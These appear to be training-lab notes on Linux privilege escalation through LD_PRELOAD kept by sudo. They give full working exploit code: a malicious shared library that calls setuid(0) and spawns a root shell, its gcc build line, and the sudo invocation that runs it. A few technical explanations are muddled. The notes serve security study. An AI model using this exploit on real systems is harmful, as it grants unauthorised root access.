# Section 20 — Shared Libraries (LD_PRELOAD)

## ID
200

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 20 — Shared Libraries (LD_PRELOAD)

## Description
Abusing the LD_PRELOAD environment variable preserved through sudo (env_keep+=LD_PRELOAD) to inject a malicious shared library that spawns a root shell before the legitimate program runs.

## Tags
ld_preload, shared-libraries, sudo, privesc, gcc, env_keep

## Commands
- `sudo -l`
- `ldd /bin/<BINARY>`
- `cat << 'EOF' > /tmp/root.c ... EOF`
- `gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles`
- `sudo LD_PRELOAD=/tmp/root.so <ALLOWED_COMMAND>`

## What This Section Covers
Linux programs use dynamically linked shared object libraries (`.so` files). The `LD_PRELOAD` environment variable forces a library to load before all others when a program runs. If `sudo` is configured with `env_keep+=LD_PRELOAD`, a user can inject a malicious `.so` that executes `setuid(0)` and spawns a root shell — regardless of what the allowed sudo command actually does.

## Methodology
1. Run `sudo -l` and look for `env_keep+=LD_PRELOAD` in the Defaults line
2. Note which command(s) you can run with NOPASSWD
3. Write a malicious C shared library with `_init()` that calls `setuid(0)` and spawns `/bin/bash`
4. Compile as a shared object: `gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles`
5. Execute: `sudo LD_PRELOAD=/tmp/root.so <YOUR_ALLOWED_COMMAND>`

## Multi-step Workflow (optional)
```
# Create malicious library
cat << 'EOF' > /tmp/root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

# Escalate (use YOUR allowed command from sudo -l)
sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — flag.txt in /root/ld_preload | `FILL_IN` | LD_PRELOAD with /usr/bin/openssl as the sudo-allowed binary |

## Key Takeaways
- The specific sudo-allowed command is irrelevant — ANY allowed command works because the malicious library executes during the loader phase, before the program itself starts
- The critical indicator is `env_keep+=LD_PRELOAD` in `sudo -l` output — without this, sudo strips all environment variables
- `unsetenv("LD_PRELOAD")` inside the library prevents infinite recursion when the spawned shell inherits the env var
- `-nostartfiles` flag is required or gcc will error about missing `main()`
- `ldd <binary>` lists shared library dependencies — useful context for the related shared object hijacking technique

### Static vs Dynamic Libraries
| Type | Extension | Behavior |
|------|-----------|----------|
| Static | `.a` | Compiled into the binary at build time; cannot be modified after |
| Dynamic | `.so` | Loaded at runtime; can be swapped or injected |

### Library Search Order
1. `-rpath` / `-rpath-link` flags at compile time
2. `LD_LIBRARY_PATH` environment variable
3. `/etc/ld.so.conf` entries
4. `/lib` and `/usr/lib` defaults
5. `LD_PRELOAD` — loaded BEFORE all of the above

## Gotchas
- You MUST use the command from YOUR `sudo -l` output — the course example used `apache2 restart` but the lab allowed `/usr/bin/openssl`
- The `-fPIC -shared -nostartfiles` flags are ALL required; missing any one causes failure
- If `env_keep+=LD_PRELOAD` is absent from `sudo -l`, this technique will not work at all
